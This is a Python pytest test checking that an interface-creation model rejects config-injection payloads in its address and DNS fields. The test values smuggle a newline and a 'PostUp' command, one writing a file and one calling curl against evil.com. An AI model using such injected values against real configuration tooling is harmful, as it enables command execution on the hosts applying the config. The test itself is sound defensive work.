import pytest
from app.models.interface import InterfaceCreate

def test_interface_create_injection_vulnerability():
    """
    Test that malicious payloads in 'address' or 'dns' are now caught by validators.
    """
    
    # Payload designed to inject a new line and a PostUp command
    malicious_payload = "10.0.0.1/24\nPostUp = echo 'pwned' > /tmp/pwned"
    
    # This should now FAIL
    with pytest.raises(ValueError, match="Invalid address format"):
        InterfaceCreate(
            name="test_vuln",
            listen_port=51820,
            address=malicious_payload,
            dns="1.1.1.1"
        )
    
    print("\n[SECURITY VERIFIED] InterfaceCreate rejected malicious address payload.")

    # Same for DNS
    malicious_dns = "1.1.1.1\nPostUp = curl http://evil.com"
    with pytest.raises(ValueError, match="Invalid DNS entry"):
        InterfaceCreate(
            name="test_vuln_dns",
            listen_port=51820,
            address="10.0.0.1/24",
            dns=malicious_dns
        )
    
    print("[SECURITY VERIFIED] InterfaceCreate rejected malicious DNS payload.")